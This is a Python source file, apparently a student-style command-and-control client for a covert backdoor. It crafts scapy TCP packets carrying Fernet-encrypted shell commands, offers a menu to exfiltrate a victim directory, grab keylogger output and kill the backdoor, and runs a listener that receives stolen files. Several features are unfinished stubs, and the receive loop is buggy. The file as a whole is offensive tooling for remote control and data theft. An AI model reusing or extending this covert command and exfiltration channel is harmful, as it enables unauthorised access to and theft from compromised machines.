###########
#File: client.py
#Author: Shiv Bhatia
###########

import sys,os
from scapy.all import *
import socket
from cryptography.fernet import Fernet
import time

host="localhost"
#host="192.168.0.176"
port=8045
TCP_EXFIL=8046
key = b'EzBmzsJH6VogpmXpxI-bJS8xXgXMGgC2T_How8q24_w='
pcap_filter="tcp[tcpflags] & (tcp-ack)==0 && (tcp dst port 8405 ||tcp dst port 8406)"
Bflag="a"
Eflag="a"
#clientsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
#clientsocket.connect((host,port)) #Run server first else you will receive connection refused error

def options():
    print ("Please select one of the following options: \n 1. Exfilterate file \n 2. Run backdoor commands \n 3. receive keylogger file \n 4. kill backdoor \n 5. kill client without killing backdoor")
    option=int(input("Please select one of the above options: "))
    choice(option)

def choice(option): #Processing the choice entered
    if option==1:exfil()
    elif option==2:bakdoor()
    elif option==3:keylog()
    elif option==4:kill_backdoor()
    elif option==5:kill_client()
    else : print("Please enter one of the above options")

def encryptmsg(crypt):
	f=Fernet(key)
	token=f.encrypt(crypt.encode())
	return token

def decryptmsg(crypt):
	f=Fernet(key)
	token=f.decrypt(crypt)
	return token

def sendchoice(choices):
    print ("You chose: " + str(choices)) #debugging line

def exfil():
	print("In Exfil")#debugging line
	print("Connecting to exfil port...")
	var="exfil"
	#clientsocket.sendall(encryptmsg(var.strip()))
	#time.sleep(5)
	#exfilsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#exfilsocket.connect((host,TCP_EXFIL))
	var = input("\nWhat directory do you want to monitor and exfilterate files from?: ")
	if var!="":
		sendpkt(var.strip(), 8405,9505)
	print("Listening for files:")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, TCP_EXFIL))
	s.listen(1)
	while True:
		sc, address = s.accept()
		#print (address)
		i=1
		f = open('file_'+ str(i),'wb') #open in binary
		i=i+1
		while (True):       
			# recibimos y escribimos en el fichero
			l = sc.recv(1024)
			while (l):
				f.write(l)
				l = sc.recv(1024)
		f.close()


		sc.close()
	s.close()
	
	options()
	
def recv_file(name):
	print("receiving file")
	

def bakdoor():
	print("In backdoor")#debugging line
	send_receive()
	

def keylog():
    print("In Keylog")#debugging line
    #clientsocket.sendall("keylogger".encode())
    #receive keylogger file
    
    #d=sniff(filter='tcp src port 8046' prn

def kill_backdoor():
    print("Killing backdoor")#debugging line
    

def kill_client():
    print("Killing client")#debugging line

def sniffer():
	s=sniff(filter=pcap_filter,prn=RecevePackets,stop_filter=stopfilter, count=1)
def stopfilter(pkt):
    if pkt[TCP].seq == 1048577:
        #wrapper("r", pkt.getlayer(IP).seq, pkt.getlayer(TCP).Raw.load())
        return True
    else:
        return False
	
def sendpkt(data, sport, dport):
	####craft packet####
	print ("sending packet")
	pkt=IP()/TCP()/Raw()
	pkt.getlayer(IP).dst=host
	pkt.getlayer(TCP).sport=sport
	pkt.getlayer(TCP).dport=dport
	edata=encryptmsg(data)
	pkt.getlayer(Raw).load=edata.strip()
	ls(pkt)
	send(pkt)
	####################
	print (edata)
	print ("waiting for reply")
	
def RecevePackets(pkt):
	print ("Receiving packets :")
	#time.sleep(5)
	if pkt.haslayer(TCP):
		if pkt.getlayer(TCP).dport==8405:
			print ("backdoor packet")
			ListenAuth(pkt)
		if pkt.getlayer(TCP).dport==8406:
			print ("exfil data")
			ListenAuth(pkt)
def ListenAuth(pkt):
	global Bflag
	global Eflag

	if pkt[TCP].seq == 1048577:
		#wrapper("r", pkt.getlayer(IP).seq, pkt.getlayer(TCP).Raw.load())
		print ("Last packet received!!! Bye")
		Bflag="a"
		Eflag="a"
	else:
		print (decryptmsg(pkt[Raw].load).decode())
		if Bflag=="c":
			print (decryptmsg(pkt[Raw].load))
			print ("^^^^^^^^^^^^")
		if Eflag=="c":
			print (pkt[Raw].load)

def send_receive():
	print("You are connected, start!")#debugging line
	BUFFER_SIZE=10000
	#start listening for reponse from server
	#If packet is from the server to the client, process it and print the output
	#Runs after sending a command to server
	while 1:
		var = input("\n>>")
		if var!="":
			#clientsocket.sendall(encryptmsg(var.strip()))
			sendpkt(var,8405,9405)
			#clientsocket.sendall(var.strip().encode())
			if var == "cd .." or var == "cd" : print("Can not change directories but you can run commands like 'cd ..&&pwd'")
			elif var=="exfil":exfil()
			else:
				#data = decryptmsg(clientsocket.recv(BUFFER_SIZE).strip())
				sniffer()
				#if data.decode()=="closing backdoor": #server has acknowledged receipt of exit command
				#	clientsocket.close()
				#	break
				#sys.stdout.write(data.decode())
				#sys.stdout.flush()
				#print (data)
		data =""
	options()
options()
#clientsocket.close()
